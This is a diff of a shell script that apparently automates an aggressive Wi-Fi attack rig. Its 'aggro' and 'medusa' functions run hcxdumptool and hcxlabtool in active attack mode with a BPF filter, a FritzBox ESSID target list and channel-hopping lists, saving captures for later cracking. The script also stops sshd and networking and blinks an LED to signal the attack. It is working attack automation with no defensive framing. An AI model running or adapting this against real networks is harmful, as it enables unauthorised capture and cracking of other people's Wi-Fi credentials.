@@ -5,7 +5,7 @@ attempts=
 bpf=/root/0wn.bpf
 logfile=/root/autohcxlab.log
 ssidlst=/root/fritzbox7590.essidliste
-# ssidlst=/root/fritzbox20.essidliste
+#ssidlst=/root/fritzbox20.essidliste
 # ********************************************
 
 trap trapfunc SIGINT SIGTERM
@@ -47,13 +47,14 @@ aggro()
         chans='1a,6a,11a,2a,1a,6a,11a,13a,1a,6a,11a,3a,1a,6a,11a,12a,1a,6a,11a,4a,1a,6a,11a,10a,1a,6a,11a,5a,1a,6a,11a,9a,1a,6a,11a,7a,1a,6a,11a,8a,1a,6a,11a,36b,1a,6a,11a,40b,1a,6a,11a,44b,1a,6a,11a,48b' # ZB config
         # chans='48b,1a,6a,11a,2a,100b,1a,6a,11a,13a,1a,6a,11a,3a,1a,48b,6a,11a,12a,1a,36b,6a,11a,4a,1a,6a,11a,10a,1a,6a,11a,5a,48b,1a,6a,11a,9a,1a,6a,11a,7a,1a,6a,11a,8a,1a,6a,100b,1a,6a,11a,1a,6a,11a,36b,1a,6a,11a'
         # chans='1a,6a,11a,2a,1a,6a,11a,13a,1a,6a,11a,3a,1a,6a,11a,12a,1a,6a,11a,4a,1a,6a,11a,10a,1a,6a,11a,5a,1a,6a,11a,9a,1a,6a,11a,7a,1a,6a,11a,8a'
-        attempts='--attemptapmax=0'
+        # attempts='--attemptapmax=0'
         # attempts='--attemptapmax=6 --attemptclientmax=15' # +2 APs +5 STs
 
         wait_iface
         systemctl stop sshd.service systemd-networkd.service systemd-resolved.service
         gpio blink 7 & blinkpid=$! # Pulse LED to indicate aggro attack
-        hcxdumptool -A --bpf=$bpf --watchdogmax=60 --onwatchdog=reboot --onerror=reboot --errormax=20 --essidlist=$ssidlst $attempts -c $chans -w $capname
+        # hcxdumptool -A --bpf=$bpf --watchdogmax=60 --onwatchdog=reboot --onerror=reboot --errormax=20 --essidlist=$ssidlst $attempts -c $chans -w $capname
+        hcxlabtool -A --bpf=$bpf --watchdogmax=60 --onwatchdog=reboot --onerror=reboot --errormax=20 --essidlist=$ssidlst $attempts -c $chans -w $capname
         trapfunc
 }
 
@@ -61,10 +62,12 @@ medusa()
 {
         capname="/root/caps/medusa_$(date "+%m%d-%H%M%S").pcapng"
         chans='1a,8a,3a,6a,4a,7a,2a,5a'
-        attempts='--attemptapmax=0 --attemptclientmax=2'
+        # attempts='--attemptapmax=0 --attemptclientmax=2'
+        attempts='--m3max=0'
 
         wait_iface
-        hcxdumptool -A --bpf=$bpf --onerror=reboot --errormax=20 --essidlist=$ssidlst $attempts -c $chans -w $capname
+        # hcxdumptool -A --bpf=$bpf --onerror=reboot --errormax=20 --essidlist=$ssidlst $attempts -c $chans -w $capname
+        hcxlabtool -A --bpf=$bpf --onerror=reboot --errormax=20 --essidlist=$ssidlst $attempts -c $chans -w $capname
         trapfunc
 }
 
